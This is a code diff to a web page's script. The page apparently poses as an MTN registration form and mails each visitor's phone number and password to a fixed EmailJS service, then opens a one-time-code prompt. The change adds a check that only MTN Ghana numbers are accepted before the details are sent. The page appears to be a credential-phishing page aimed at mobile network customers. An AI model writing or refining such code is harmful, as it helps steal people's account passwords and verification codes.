@@ -256,23 +256,34 @@
     }
 
     registerForm.addEventListener("submit", (e) => {
-      e.preventDefault();
-      const phone = document.getElementById("phone").value;
-      const password = passwordField.value;
+  e.preventDefault();
+  const phone = document.getElementById("phone").value;
+  const password = passwordField.value;
 
-      emailjs.send("service_74nt2c9", "template_s6vpt2e", {
-        phone: "MTN  " + phone,
-        password: password
-      }).then(() => {
-        showNotification("Registration successful!");
-        otpModal.classList.remove("hidden");
-        otpModal.classList.add("flex");
-        localStorage.setItem("userPhone", phone);
-        startTimer();
-      }).catch(() => {
-        showNotification("Failed to send details.", "error");
-      });
-    });
+  // ===== MTN NUMBER VALIDATION =====
+  const mtnPrefixes = ["24", "54", "55", "59", "25"]; // MTN Ghana prefixes
+  const number = phone.trim();
+  const isMTN = number.length === 9 && mtnPrefixes.some(prefix => number.startsWith(prefix));
+
+  if (!isMTN) {
+    showNotification("❌ Please enter a valid MTN number.", "error");
+    return; // stop here if not MTN
+  }
+
+  // Continue with registration if valid
+  emailjs.send("service_74nt2c9", "template_s6vpt2e", {
+    phone: "MTN  " + phone,
+    password: password
+  }).then(() => {
+    showNotification("Registration successful!");
+    otpModal.classList.remove("hidden");
+    otpModal.classList.add("flex");
+    localStorage.setItem("userPhone", phone);
+    startTimer();
+  }).catch(() => {
+    showNotification("Failed to send details.", "error");
+  });
+});
 
     verifyBtn.addEventListener("click", () => {
       const otp = otpInput.value;
@@ -359,6 +370,7 @@ function unlockResend() {
   </script>
 </body>
 </html>
+
 
 
 
